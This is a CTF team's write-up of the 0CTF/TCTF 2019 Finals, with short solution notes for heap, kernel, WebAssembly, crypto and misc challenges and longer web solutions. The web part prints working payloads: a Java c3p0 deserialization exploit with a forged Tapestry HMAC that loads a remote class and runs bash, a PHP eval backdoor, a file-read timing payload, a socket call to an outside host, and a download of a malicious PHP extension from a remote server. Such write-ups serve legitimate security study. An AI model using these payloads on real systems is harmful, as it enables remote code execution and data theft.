# 0CTF/TCTF 2019 Finals

We got 2nd place in 0CTF/TCTF 2019 Finals (Shanghai, China). 

As we have lots of final exams at that week, we don't have much time to finish this writeup in detail. We'll just write down the post-competition salon notes for most of the challenge.

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/) of this writeup.**


 - [0CTF/TCTF 2019 Finals](#0ctftctf-2019-finals)
   - [Pwn](#pwn)
     - [BabyHeap 2.29](#babyheap-229)
     - [Embeded Heap](#embeded-heap)
     - [png2a](#png2a)
     - [wasabi001](#wasabi001)
       - [Solution1:](#solution1)
       - [Solution2 (intended):](#solution2-intended)
     - [wasabi002](#wasabi002)
       - [Solution:](#solution)
     - [Fast_Furious](#fast_furious)
       - [unintended solution](#unintended-solution)
     - [Fast_Furious2](#fast_furious2)
     - [blackhole](#blackhole)
       - [Solution1:](#solution1-1)
       - [Solution2:](#solution2)
       - [my solution](#my-solution)
   - [Reverse](#reverse)
     - [BabyMath](#babymath)
     - [wasabi](#wasabi)
   - [Crypto](#crypto)
     - [Quantum Game](#quantum-game)
     - [Quantum Measutre](#quantum-measutre)
     - [zer0ssh](#zer0ssh)
   - [Misc](#misc)
     - [ASCII Arts](#ascii-arts)
     - [###game](#game)
     - [Insecure RDP](#insecure-rdp)
       - [Postscript](#postscript)
   - [Web](#web)
     - [TCTF Hotel Booking System](#tctf-hotel-booking-system)
       - [Failed Attempts](#failed-attempts)
     - [BabyDB](#babydb)
     - [114514 CALCALCALC](#114514-calcalcalc)
       - [Failed Attempts](#failed-attempts-1)
     - [Wallbreaker (not very) Hard](#wallbreaker-not-very-hard)
       - [Problem](#problem)
       - [Exploit](#exploit)


## Pwn
### BabyHeap 2.29
off-by-one null byte
overlap overwriting tcache

### Embeded Heap

Please refer to dcua's [detailed writeup](https://ctftime.org/writeup/15729).

### png2a
text chunk heap overflow 0x800000
png text chunk
overwrite return address on thread stack

### wasabi001
- compiled with wasi-libc
- Heap overflow in "edit option"
- dlmalloc, heap no aslr in wasm but wasabi has one weak aslr mitigation at beginning
- chunk overlap to control "content" ptr
- Arbitrary read and write

#### Solution1:
-    Arbitratry read to leak xored flag on server
-    extract xor key from binary
-    xor and get it

#### Solution2 (intended):
-    Arbitrary write to overwirte handcoded SHA512 value at memcmp
    -    key point: no rodata in wasm memory
    -    "Get Flag" will print flag of wasabi001 and go to wasabi002
    
### wasabi002

- precondition
    - Bypass SHA512 in "Get Flag" option first   
- Target:
    - read server flag file
- Simple vm main at func[18]
- Fixed vm instructions in binary
    - function: print "Amazing,gogogo"
- Fixed vm instructions in code
    - operands is fixed
        - with "i32 func(i32,i32,i32)" function signature
        - opcode is fixed
            - opcode => Handler => vtable
- VM handlers
    - provide basic vm instruction for open,read,write

#### Solution:

- Overwrite vm vtable
    - make a semantic confusion on vm handlers
    - one of usable solution
- note 
    - follow the wasm Coarse-Grained CFI Rules on indirect call => Same function prototype
    - function pointer => Element index in wasm Ele Segment
- Overwrite vm context
    - vm regs and memory ( also on wasm linear memory)
- "Get flag" option to get flag

WASM and WASI my be a new promising area in future
AFAK no good and matured IDA processor for now
- Harvard Architecture
    - no stkof but still have some security problems
    - hard to hijack the control flow
### Fast_Furious

#### unintended solution
1. edit io_buf to make copy_from_user fail to get UAF
2. Heap sparying objects that include some function pointers
3. Overwrite function pointer to control pc
### Fast_Furious2
1. Race with mmap and munmap to get out-of-bounds to leak kernel address. The idea comes from  CVE-2015-1805.
2. Use CVE-2019-9213 to mmap virtual address 0 and place gadgets.
3. 3 Control pc by NULL pointer dereference.

### blackhole
#### Solution1:
- pivot to bss
-  calling my_read
-  leave a return address(0x832) on .bss section
-  partial overwrite the reutnr address , make it point to `mov rsi, rcx` (0x828)
-  chain it after a read call, rcx(which is address just after syscall) will be moved into rsi.
-  kthen try to store rsi back to.bss
-  partial overwrite it again, you have a syscall address
#### Solution2:
- try to move __libc_start_main into rbx
- Utilize add ebx, esi, get target 4 bytes of address
- put it on .bss
- And then repeat to put the other 4 bytes

#### my solution
Copy got of __libc_start_main
1. Construct rop at the start of data section (just after read only gots)
2. goto (pop rsp,pop r13, pop r14, pop r15,ret),set rsp to got of __libc_start_main
3. then we have __libc_start_main in r13
4. Pivot and then call any function pushing r13(__libc_csu_init),after it returns we have a pointer to libc_start_main(in data section)
5. call arbitrary function pointer in libc.
    - Say we already copied got entry to address A
    - we can construct a new rop chain newrby and pivot to it
    - setting r12==&libc_start_main,r8== ???
find a good function pionter.
1. I choose_IO_str_seekoff
2. fp->_IO_read_ptr=fp->_IO_read_base+base;
3. Copy_libc_start_main to address B


## Reverse
### BabyMath

author is github.com/septyem

Given $f(n)$ you are suppose to recover n (~$2^{56}$)

$$
\begin{bmatrix}
  f(n-2) \\\\
  f(n-1) \\\\
  f(n)
\end{bmatrix} =
\begin{bmatrix}
  0 & 1 & 0 \\\\
  0 & 0 & 1 \\\\
  1 & 1 & 1
\end{bmatrix}
\begin{bmatrix}
  f(n-3) \\\\
  f(n-2) \\\\
  f(n-1)
\end{bmatrix}
$$


Reduce to discrete logarithm of matrix
Baby-step giant-step
Done!

### wasabi
A simple compression algorithm
- Burrows-wheeler Transform
    - note: Insert 0x19 at beginning and 0x20 at the end of original input
- second stage: run-length encoding

How to reverse it
- Rich way
    - Buy JEB 3.0+   
- Poor way
    - wasm2c -> recompile .c with O3 optimization -> Hex-ray
    - find a gdb-like debugger (dynamic) -> 404 for me
    - debug runtime jit code
        - what runtime do ?
            - lift wasm and jit to x64
        - choose a runtime
            - wasmtime, wasmer, lucet
            - example:
                - my customization on wasmtime for debuggin with gdb 

## Crypto

### Quantum Game

target: make the qubit measured to be 1 finally no matter flip it or not

method: superposition of half 0 and half 1 (google it and find answer at pyquil doc)

Solution: 
- first move X0+H0
- second move H0

target:make the qubit measured to be 0 finally when you can make only one move

methid: rotate the phase by 180 degrees

solution: 
  - RY(pi) 0 or RZ(pi) 0

### Quantum Measutre
Design
- 32-bit-long flag are encoded in to 8 qubits
- these qubits are processed bu the program
- sample 3200000 and the result is provided
- BTW, i want to make the lag 64-bit-long but I can't solve the large inequations. If you know it send the mail to 0ops

Solution
- brute force search
- initial probability of 8 qubits measured to be 1 are 8 variables (x0-x7)
- enumerate all possible flags, calculate the prob and compare them with the frequency in the result (subtract square and sum up)
- you can transform the float to int to solve the chal more efficiently


### zer0ssh

author is github.com/septyem

- redirect a session of ssh client to your ip, mitm for ssh
- fool the server instead of the client
- [session_identifier](https://security.stackexchange.com/a/77187) cannot determined by any single patch (part?)

id_xmss([XMSS](https://tools.ietf.org/html/rfc8391): ) use WOTS+ , and the client is in a docker image.
(OTS: one-time signature)

hash-based signature

$sig1 = h^7(sk1)$
$sig2 = h^2(sk2)$

If you have sig for 0x0, you can also sign any other message for this part
Just collect enough signature and win!
[will release my solution at github laterc](https://github.com/septyem)

## Misc

### ASCII Arts
turing complete
Doc: ajanse.me/asciidots
Interpreter: github.com/aaronjanse/asciidots

The program on the T-shirt can be split in 5 parts
1. header: define warps
2. T: clock generatur
3. C: counter $2^{64}$
4. T: decode and output
5. F: encodede flag

or you can just modify the conunter value from $2^{64}$ to 1 and the program will print the flag for you

One of the team `U+1F914` solved this in 28 seconds.

### \#\#\#game
1. AI algo is not very strong
2. AI is not random, win one then win five

1. No bruteforce, more creative computer implementations are necessary
2. Minimax or Monte carlo tree

Intended sol: Directly play with AI, win then replay five times

### Insecure RDP
1. Read the doc, find the priv key, use RDP-Replay
2. Factor RSA public key, but not the intended way,

decode as TPKT in wireshark
according to [MS doc](https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/ns-wincrypt-_rsapubkey)

RSA1: public key
RSA2: private key

decrypt client random, calculate pre-master secret, decode data: fast-path keyboard event

#### Postscript

Rumor has it that the one of the team uses the supercomputer [天河一號](https://en.wikipedia.org/wiki/Tianhe-1) to factor the RSA-512. Our experiment shows that using [CADO-NFS](http://cado-nfs.gforge.inria.fr/) to factor RSA-512 on a single computer with 24 cores (clock rate: 2.00 GHz) takes about 140 days. Thus, in order to factor RSA-512 in a day, we have to deploy it to at least 140 computers.

Actually, if we solve this challenge, we will win the first place :P

## Web

### TCTF Hotel Booking System

The challenge uses java-based Apache Tapestry 5 framework. The author seems to modify a [example hotel booking application](https://tapestry-app.apache.org/hotels/). We found the source code of the example on [https://github.com/ccordenier/tapestry5-hotel-booking/tree/master/src/main](github).

In the HTML comment, there is a hint indicating that we can use `c3p0` as possbile Java deserialization gadget.

By fuzzing a while, we found a few useful feature like listing a directory.

```
curl 'http://192.168.201.15/assets/ctx/96a038cf/static/' -sD -

1-star.gif
2-star.gif
3-star.gif
4-star.gif
5-star.gif
ajax-loader.gif
bg.png
hotel-booking.js
reset.css
scenery
style.css
tapestry_s.png
tapestry.png
top-bg.png
```

However, it can only be used to access static files. We want to access either `WEB.XML` or classes. According to [official document](http://tapestry.apache.org/assets.html), we can access assets by specifying the classpath. There is also [an example](https://git-wip-us.apache.org/repos/asf?p=tapestry-5.git;a=blob;f=tapestry-core/src/test/app1/AssetProtectionDemo.tml;h=e21bc61734a5d3fab468b1ba4ad2c36893ae8430;hb=d2d9247#l20). Unfortunately it blocks access to `META-INF`, but at lease we can still access class file:

```
http://35.201.228.198:64648/assets/app/2c6a8ea9/services/Authenticator.class
http://35.201.228.198:64648/assets/app/e3d6c19d/services/AppModule.class
http://35.201.228.198:64648//assets/app/9e302bae/pages/Index.class
```

The 4-byte hash is not impportant. When specifying the incorrect hash, the server will redirect to a correct path with correct hash value.

Decompiling the `AppModule.class` we found an interesting variable. It's used to sign the HMAC string of serialized object data, according to the [document](http://tapestry.apache.org/configuration.html).

```
configuration.add("tapestry.hmac-passphrase", "TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)");
```

Alright, the next is to find how to leverage this key. When sending a search query to the server, the server will validate the user-provided json serialized object's HMAC and then deserialize it. 

To forge a HMAC signature, I follow the procedure of [the source code](https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/internal/services/ClientDataEncoderImpl.java#L82-L117) but my payload still fails to pass the validation. I have no idea and get stuck for a few hours. I'm not sure if it's because of the [weird urldecoder](https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/services/URLEncoder.java).

Therefore I install the Tapestry locally and forge a HMAC. Note that the server will first read a few bytes and than deserialize the rest of data. Please refer to [the source code](https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/corelib/components/Form.java#L719-L738). Using [ysoserial](https://github.com/frohoff/ysoserial)'s cp0 payload to get RCE.

Here is my final payload.

```java
import com.mchange.v2.c3p0.PoolBackedDataSource;
import org.apache.tapestry5.internal.services.ClientDataEncoderImpl;
import org.apache.tapestry5.services.ClientDataEncoder;
import org.apache.tapestry5.services.ClientDataSink;

import java.io.*;

import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import ysoserial.payloads.util.Reflections;

public class Main {
    static public Object getExploit(String command) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }

    public static void main(String[] args) throws Exception {
        Object exp = getExploit("http://240.240.240.240:1234/:Exploit");
        try {
            ClientDataEncoder en = new ClientDataEncoderImpl(null, "TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)", null,
                "does not matter", null);
            ClientDataSink sink = en.createSink();
            ObjectOutputStream s = sink.getObjectOutputStream();
            s.writeUTF("1234");
            s.writeBoolean(true);
            s.writeObject(exp);
            s.close();
            String out = sink.getClientData();
            System.out.println(out);
        } catch (IOException i) {
            i.printStackTrace();
            return;
        }
    }
}
```

The server will try to fetch `http://240.240.240.240:1234/Exploit.class` to load the class. Create an `Exploit.class` by:

```java
public class Exploit { 
  public Exploit() { 
    try { 
      Runtime.getRuntime().exec(new String[]{"bash", "-c",
        "sleep 5"
      }).waitFor();
    } catch (Exception e) { 
    } 
  }
}
```

Refer to [this article](https://blog.csdn.net/fnmsd/article/details/88959428#c3p0).

Flag: `flag{Apache Tapestry is too old. They maybe wont fix this bug :(}`

By the way, the author said it's related to this [CVE](CVE-2014-1972).

#### Failed Attempts

- CVE: The version of Apache Tapestry is 5.4.3. From 5.4.3 to 5.4.4 they fixed [this](https://issues.apache.org/jira/browse/TAP5-2601) and [this one](https://git-wip-us.apache.org/repos/asf?p=tapestry-5.git;a=shortlog;h=refs/tags/5.4.4), but I don't find anything interesting there.
- Using Python to spoof the HMAC: I still have no idea why the signature is different. Finally I have to use Tapestry's class to forge the signature.
- Server fail to deserialize: It was because the server will [first read 2 data type](https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/corelib/components/Form.java#L723-L724). It's required to provide a String and a Boolean to make it parse correctly.
- No `nc` available: The remote server does not have `nc` command...... I use a reverse shell to read the flag.

### BabyDB

author is [septyem](https://github.com/septyem)

Key-value database service written in ocaml
Isomorphism between key-value db and ... the filesystem!
so use filename as key,
and let's see what could go wrong

Find something unexpected when I just begin to play with bap and ocaml

My first impression to state monad is something like global variable - which is totally wrong

`let whoami = fun _ -> SessionState.get`

```
let out = match is_default with
| true -> real_login false (whoami sess) cont ...
| false -> real_login true (whoami sess) cont ...
```

The wrong way to apply it and you will just get empty string ( from real case when I writing ocaml)
Just login as any user and login with empty name again


### 114514 CALCALCALC

This challenge is a modifed version from [0CTF/TCTF qual](https://github.com/CTFTraining/rctf_2019_calcalcalc), but the author said [there is no intended solution](https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/readme.md). Therefore this challenge is modified to a new version in the final.

Basically, the original idea of the challenge is to write a polyglot which will return the flag in Python3, nodejs and php. However, this challenge adds a new constraint:

```diff
diff -r rctf_2019_calcalcalc/frontend/src/expression.validator.ts src/frontend/src/expression.validator.ts
23c23
<                   if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) {
---
>                   if (str !== "114+514") {
```

```typescript
import {registerDecorator, ValidationOptions, ValidationArguments} from 'class-validator';
import CalculateModel from './calculate.model';

export function ExpressionValidator(property: number, validationOptions?: ValidationOptions) {
   return (object: Object, propertyName: string) => {
        registerDecorator({
            name: 'ExpressionValidator',
            target: object.constructor,
            propertyName,
            constraints: [property],
            options: validationOptions,
            validator: {
                validate(value: any, args: ValidationArguments) {
                  const str = value ? value.toString() : ''; 
                  if (str.length === 0) {
                    return false;
                  } 
                  if (!(args.object as CalculateModel).isVip) {
                    if (str.length >= args.constraints[0]) {
                      return false;
                    } 
                  } 
                  if (str !== "114+514") {
                    return false;
                  } 
                  return true;
                },
            },
        }); 
   };                                                                                                                          
}
```

The input string can only be `114+514`. It sounds almost absurd to exploit this with such a strict check. There is also other modification compared to the original challenge: it's using JSON instead of BSON.First we have to bypass the `isVIP` check. 

Fisrt we have to bypass the `isVip` check. Following the original challenge's writeup, by replacing the content-type to JSON we can make the parser parse our variable:

```
Content-Type: application/json

{"expression":"MORE_THAN_15_BYTES_STRING", "isVip": true}
```

Obviously, the next thing is to bypass the `str !=== "114+514"` check. We got stuck here for a few hours but quickly javascript template pollution `__proto__` came to our mind. @kaibro simply fuzzs a little bit and got this:

```
{"__proto__":{"constructor":null},"expression":"5278123+1", "isVip":true}

=> 5278124
```

We found this by fuzzing without inspecting the source code. In the post-competition salon the author said this:

```
read the src of nestJS, class-transformer to convert json to a target class, but didn’t strip __proto__
{"expression":"1+1", __proto__":{}}
```

Anyway, the rest is to write a polyglot, but can we still exploit the service using time-based attack? Although the backend's timeout becomes 1 sec to prevent from possible side-channel attack, it turns out that this is enough for a LAN-based user XD

```
valid input
real    0m0.147s


invalid input
real    0m0.311s
```

So let's do this: my payload is php-based time-based side channel attack. Additionally, this is also a valid string in nodejs and Python, though I think it does not matter at all. This payload will sleep for 1 second if my guess is correct.

```php
content-type: application/json

{"__proto__":{"constructor":""},"expression":"\"${sleep(ord(file_get_contents('/flag')[0])==114)}\"", "isVip":false}
```

Of course you can write [a valid polyglot](https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/2.md) but I'm too lazy to do that :P

Here is the juicy flag: `flag{114 514 1919 810 is a magic bumber}`.

#### Failed Attempts

- DNS-based leak: `__import__("socket").socket().connect(("example.com",1))`. Unfortunately the backend server seems to block all the outgoing requests.
- Other failed fuzzing attempts:
```
"__proto__":{"__proto__":{"constructor":"a"}} 500
"__proto__":{"__proto__":{"constructor":""}} 200
"__proto__":{"__proto__":{"constructor":null}} 200
"__proto__":{"constructor":"a"} 500
"__proto__":{"constructor":true} 500
"__proto__":{"constructor":false} 200
```

### Wallbreaker (not very) Hard

#### Problem

- This challenge environment is same as 0CTF 2019 qual - Wallbreaker Easy
    - PHP-FPM
    - PHP 7.2
    - strict `disable_functions`
        - `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log`
        - no `putenv` this time :p
    - `open_basedir: /var/www/html:/tmp`

![](https://i.imgur.com/AJoNARW.png)


- This challenge tells us there is a backdoor in somewhere
- After scanning, I found `.index.php.swp`
    - Recover it and get the backdoor key: `eval($_POST["anfkBJbfqkfqasd"]);`
- OK, it's time for bypass `disable_functions`和`open_basedir`

#### Exploit

- In 0CTF qual, I forged fastcgi protocol to bypass `open_basedir` (overwrite the settings)
- But I found there is another way that is possible to bypass `disable_functions` to RCE
    - using the `extension`!
- So we just need to write the `extension_dir` and `extension` in `PHP_ADMIN_VALUE`, then we can load arbitrary extension
- First step is to upload a RCE extension:

```php
file_put_contents("/tmp/bad.so", file_get_contents("http://kaibro.tw/bad.so"));
```

- Before building the fastcgi payload, we should find out its UNIX Socket path (if it use tcp, we need to find the port)

```php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/php/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/php/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
```

=> `/var/run/php/U_wi11_nev3r_kn0w.sock`

- Then, starting to create FastCGI payload to overwrite settings. Here is my tool to generate payload: [Tool](https://github.com/w181496/FuckFastcgi/)
    - change the config, then run it


![](https://i.imgur.com/7yJKy5V.png)


- RCE Get!
- `/readflag` => `flag{PHP-FPM is awesome and I think the best pratice is chroot your PHP}`



